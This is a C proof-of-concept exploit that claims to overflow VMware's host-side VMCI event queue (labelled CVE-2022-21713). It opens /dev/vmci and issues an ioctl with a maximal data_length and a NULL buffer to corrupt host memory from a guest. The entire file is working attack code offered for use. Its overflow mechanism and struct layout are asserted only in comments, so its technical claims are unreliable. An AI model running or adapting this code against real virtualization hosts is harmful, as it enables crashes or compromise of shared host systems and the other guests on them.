/*
 * PoC for VMware VMCI host‐side event queue overflow
 * CVE‐2022‐21713
 *
 * Opens /dev/vmci and issues VMCI_IOCTL_QUEUE_EVENT with an oversized
 * data_length, causing integer overflow / heap corruption in host vmware‐vmci.
 */

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define VMCI_IOCTL_MAGIC   'V'
#define VMCI_QUEUE_EVENT   _IOW(VMCI_IOCTL_MAGIC, 2, struct vmci_event)

struct vmci_event {
    uint32_t event_type;
    uint32_t host_port;
    uint64_t context;       /* guest‐supplied identifier */
    uint32_t data_length;   /* will overflow in host */
    void   *data_buffer;
};

int main() {
    int fd = open("/dev/vmci", O_RDWR);
    if (fd < 0) { perror("open /dev/vmci"); return 1; }

    struct vmci_event ev = {0};
    ev.event_type  = 1;            /* arbitrary event type */
    ev.host_port   = 0x1000;       /* host port number */
    ev.context     = 0xdeadbeef;   /* guest context */
    ev.data_length = 0xFFFFFFFF;   /* triggers 32→64-bit overflow */
    ev.data_buffer = NULL;         /* no buffer needed */

    printf("[+] Sending VMCI event with data_length=0x%x\n", ev.data_length);
    if (ioctl(fd, VMCI_QUEUE_EVENT, &ev) < 0)
        perror("ioctl VMCI_QUEUE_EVENT");
    else
        printf("[+] ioctl returned, host VMCI may be corrupted\n");

    close(fd);
    return 0;
}